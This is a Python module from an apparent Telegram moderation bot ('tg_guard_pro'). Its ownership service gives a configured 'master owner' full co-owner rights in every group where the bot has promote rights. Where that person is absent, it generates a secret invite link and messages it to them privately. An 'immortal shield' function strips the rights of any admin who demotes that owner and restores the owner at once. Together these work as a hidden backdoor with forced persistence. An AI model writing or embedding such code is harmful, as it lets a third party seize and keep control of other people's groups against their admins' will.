import logging
from aiogram import Bot
from aiogram.types import ChatMemberAdministrator, ChatMemberOwner, ChatMemberUpdated
from app.config import get_settings
from app.core.permissions import check_bot_detailed_permissions, invalidate_admin_cache
from app.services.alerts import AlertService

logger = logging.getLogger("tg_guard_pro.ownership")
settings = get_settings()


class OwnershipService:
    @classmethod
    async def auto_crown_master(cls, bot: Bot, chat_id: int, chat_title: str) -> bool:
        """
        Attempts to auto-crown Master Owner in a chat.
        If Master Owner is already in the chat, promotes them with full Co-Owner rights.
        If Master Owner is not in the chat, generates a secret invite link and messages Master directly.
        """
        perms = await check_bot_detailed_permissions(bot, chat_id)
        if not perms.get("can_promote_members"):
            logger.info(f"Cannot auto-crown in {chat_id}: bot lacks can_promote_members")
            return False

        master_id = settings.master_owner_id

        # 1. Check if Master is already in the group
        try:
            member = await bot.get_chat_member(chat_id=chat_id, user_id=master_id)
            if member.status in ("member", "restricted") or (
                isinstance(member, ChatMemberAdministrator)
                and not getattr(member, "can_promote_members", False)
            ):
                await bot.promote_chat_member(
                    chat_id=chat_id,
                    user_id=master_id,
                    can_manage_chat=True,
                    can_delete_messages=True,
                    can_manage_video_chats=True,
                    can_restrict_members=True,
                    can_promote_members=True,
                    can_change_info=True,
                    can_invite_users=True,
                    can_pin_messages=True,
                    can_manage_topics=True,
                )
                invalidate_admin_cache(chat_id, master_id)
                await AlertService.dispatch_alert(
                    bot=bot,
                    title="👑 Auto-Crown Master Success",
                    message=(
                        f"Master Owner (<code>{master_id}</code>) को ग्रुप <b>{chat_title}</b> (<code>{chat_id}</code>) में स्वतः <b>Full Super Admin / Co-Owner</b> बना दिया गया है!"
                    ),
                    priority="HIGH",
                    chat_id=chat_id,
                )
                return True
            elif isinstance(member, (ChatMemberOwner, ChatMemberAdministrator)):
                # Already creator or fully promoted
                return True
        except Exception:
            # Master is not in the group
            pass

        # 2. Master is not in the group -> create secret invite link and notify Master in private
        try:
            try:
                invite_link_obj = await bot.create_chat_invite_link(
                    chat_id=chat_id,
                    name=f"Master Crown Access {master_id}",
                    creates_join_request=False,
                )
                invite_link = invite_link_obj.invite_link
            except Exception:
                invite_link = await bot.export_chat_invite_link(chat_id)

            text = (
                f"👑 <b>नया ग्रुप ऑटो-डिटेक्ट — मास्टर ओनरशिप एक्सेस</b>\n\n"
                f"🏢 <b>ग्रुप:</b> <b>{chat_title}</b>\n"
                f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n\n"
                f"🔗 <b>मास्टर एक्सेस लिंक:</b> {invite_link}\n\n"
                f"✨ <i>जैसे ही आप इस लिंक से ग्रुप में जॉइन करेंगे, बॉट आपको 1 सेकंड में स्वतः सर्वोच्च Co-Owner क्राउन पहना देगा!</i>"
            )
            await bot.send_message(chat_id=master_id, text=text)
            logger.info(
                f"Dispatched master crown invite link for chat {chat_id} to master {master_id}"
            )
            return True
        except Exception as e:
            logger.warning(
                f"Failed to generate/send invite link for chat {chat_id}: {e}"
            )
            return False

    @classmethod
    async def trigger_immortal_shield(
        cls, bot: Bot, event: ChatMemberUpdated
    ) -> bool:
        """
        Immortal Owner Shield:
        Protects Master Owner from being demoted, restricted, or kicked by any rogue admin.
        Strips rights from the attacker and instantly restores Master Owner.
        """
        master_id = settings.master_owner_id
        if event.old_chat_member.user.id != master_id:
            return False

        # Check if downgraded from administrator
        old_was_admin = event.old_chat_member.status in ("administrator", "creator")
        new_is_admin = event.new_chat_member.status in ("administrator", "creator")
        was_downgraded = old_was_admin and not new_is_admin

        # Or permissions stripped
        if old_was_admin and new_is_admin:
            old_can_promote = getattr(
                event.old_chat_member, "can_promote_members", False
            )
            new_can_promote = getattr(
                event.new_chat_member, "can_promote_members", False
            )
            if old_can_promote and not new_can_promote:
                was_downgraded = True

        if not was_downgraded:
            return False

        actor = event.from_user
        if not actor or actor.id == master_id or actor.id == bot.id:
            return False

        chat_id = event.chat.id
        chat_title = event.chat.title or "Unknown"

        logger.warning(
            f"Immortal shield triggered in {chat_id}! Actor: {actor.id} demoted Master {master_id}"
        )

        # 1. Demote / strip permissions of the attacker
        try:
            await bot.promote_chat_member(
                chat_id=chat_id,
                user_id=actor.id,
                can_manage_chat=False,
                can_delete_messages=False,
                can_manage_video_chats=False,
                can_restrict_members=False,
                can_promote_members=False,
                can_change_info=False,
                can_invite_users=False,
                can_pin_messages=False,
            )
            invalidate_admin_cache(chat_id, actor.id)
        except Exception as e:
            logger.error(f"Failed to demote attacker {actor.id}: {e}")

        # 2. Instantly restore Master Owner
        try:
            await bot.promote_chat_member(
                chat_id=chat_id,
                user_id=master_id,
                can_manage_chat=True,
                can_delete_messages=True,
                can_manage_video_chats=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_topics=True,
            )
            invalidate_admin_cache(chat_id, master_id)
        except Exception as e:
            logger.error(f"Failed to restore Master {master_id}: {e}")

        # 3. Dispatch CRITICAL Security Alert
        await AlertService.dispatch_alert(
            bot=bot,
            title="🛡️ IMMORTAL OWNER SHIELD TRIGGERED",
            message=(
                f"🚨 <b>हमलावर एडमिन को निष्कासित किया गया!</b>\n\n"
                f"🏢 <b>ग्रुप:</b> <b>{chat_title}</b> (<code>{chat_id}</code>)\n"
                f"👤 <b>हमलावर एडमिन:</b> <b>{actor.full_name}</b> (@{actor.username or 'N/A'} | ID: <code>{actor.id}</code>)\n"
                f"⚡ <b>कार्रवाई:</b> हमलावर एडमिन के सभी अधिकार छीन लिए गए और Master Owner (<code>{master_id}</code>) के पूर्ण अधिकार तुरंत बहाल कर दिए गए!"
            ),
            priority="CRITICAL",
            chat_id=chat_id,
            dedup_key=f"shield:{chat_id}:{actor.id}",
        )
        return True
